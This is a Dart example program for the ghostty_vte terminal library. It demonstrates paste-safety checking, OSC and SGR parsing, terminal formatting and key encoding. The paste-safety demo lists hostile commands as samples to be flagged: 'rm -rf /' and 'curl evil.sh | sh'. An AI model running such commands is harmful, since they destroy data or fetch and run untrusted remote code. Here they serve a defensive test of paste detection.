import 'package:ghostty_vte/ghostty_vte.dart';

/// A pure Dart CLI example demonstrating the core ghostty_vte APIs:
///
/// - Paste safety checking
/// - OSC (Operating System Command) parsing
/// - SGR (Select Graphic Rendition) parsing
/// - Terminal state + formatter output
/// - Key event encoding
void main() {
  _demoPasteSafety();
  _demoOscParser();
  _demoSgrParser();
  _demoTerminalFormatting();
  _demoKeyEncoding();
}

void _demoPasteSafety() {
  print('=== Paste Safety ===');

  final samples = {
    'ls -la': GhosttyVt.isPasteSafe('ls -la'),
    'echo hello': GhosttyVt.isPasteSafe('echo hello'),
    'rm -rf /\n': GhosttyVt.isPasteSafe('rm -rf /\n'),
    'curl evil.sh | sh\x1b': GhosttyVt.isPasteSafe('curl evil.sh | sh\x1b'),
  };

  for (final entry in samples.entries) {
    final label = entry.key.replaceAll('\n', '\\n').replaceAll('\x1b', '\\e');
    print('  "$label" -> safe? ${entry.value}');
  }
  print('');
}

void _demoOscParser() {
  print('=== OSC Parser ===');

  final osc = GhosttyVt.newOscParser();
  osc.addText('0;My Terminal Title');

  final command = osc.end(terminator: 0x07);
  print('  Parsed OSC type: ${command.type}');
  if (command.windowTitle != null) {
    print('  Window title: ${command.windowTitle}');
  }

  osc.close();
  print('');
}

void _demoSgrParser() {
  print('=== SGR Parser ===');

  final sgr = GhosttyVt.newSgrParser();

  final attrs = sgr.parseParams(<int>[1, 31, 4]);
  for (final attr in attrs) {
    print('  SGR attribute: tag=${attr.tag}');
  }

  final reset = sgr.parseParams(<int>[0]);
  for (final attr in reset) {
    print('  SGR attribute: tag=${attr.tag}');
  }

  sgr.close();
  print('');
}

void _demoTerminalFormatting() {
  print('=== Terminal + Formatter ===');

  final terminal = GhosttyVt.newTerminal(cols: 30, rows: 6);
  final plainFormatter = terminal.createFormatter(
    const VtFormatterTerminalOptions(
      emit: GhosttyFormatterFormat.GHOSTTY_FORMATTER_FORMAT_PLAIN,
      trim: true,
    ),
  );
  final vtFormatter = terminal.createFormatter(
    const VtFormatterTerminalOptions(
      emit: GhosttyFormatterFormat.GHOSTTY_FORMATTER_FORMAT_VT,
      trim: true,
      extra: VtFormatterTerminalExtra(
        screen: VtFormatterScreenExtra(style: true, cursor: true),
      ),
    ),
  );

  terminal.write('Hello\r\n\x1b[31mWorld\x1b[0m');
  print('  Plain snapshot:');
  print(_indent(plainFormatter.formatText()));
  print(
    '  Plain snapshot (allocated): '
    '${_quoted(plainFormatter.formatTextAllocated())}',
  );
  print('  VT snapshot: ${_escapedBytes(vtFormatter.formatBytes())}');

  terminal.resize(cols: 20, rows: 4);
  terminal.reset();
  terminal.write('After reset');
  print('  After reset: ${_quoted(plainFormatter.formatText())}');

  vtFormatter.close();
  plainFormatter.close();
  terminal.close();
  print('');
}

void _demoKeyEncoding() {
  print('=== Key Encoding ===');

  final terminal = GhosttyVt.newTerminal(cols: 80, rows: 24);
  final encoder = GhosttyVt.newKeyEncoder();
  final event = GhosttyVt.newKeyEvent();

  terminal.write('\x1b[?1h');
  encoder.setOptionsFromTerminal(terminal);

  event
    ..action = GhosttyKeyAction.GHOSTTY_KEY_ACTION_PRESS
    ..key = GhosttyKey.GHOSTTY_KEY_ARROW_UP;

  final encoded = encoder.encode(event);
  if (encoded.isNotEmpty) {
    print('  Up arrow in application mode: ${_escapedBytes(encoded)}');
  } else {
    print('  Up arrow produced no output');
  }

  event.close();
  encoder.close();
  terminal.close();
  print('');
}

String _escapedBytes(List<int> bytes) {
  return bytes
      .map(
        (b) => b < 0x20 || b == 0x7F
            ? '\\x${b.toRadixString(16).padLeft(2, '0')}'
            : String.fromCharCode(b),
      )
      .join();
}

String _indent(String text) =>
    text.split('\n').map((line) => '    $line').join('\n');

String _quoted(String text) => '"${text.replaceAll('\n', '\\n')}"';
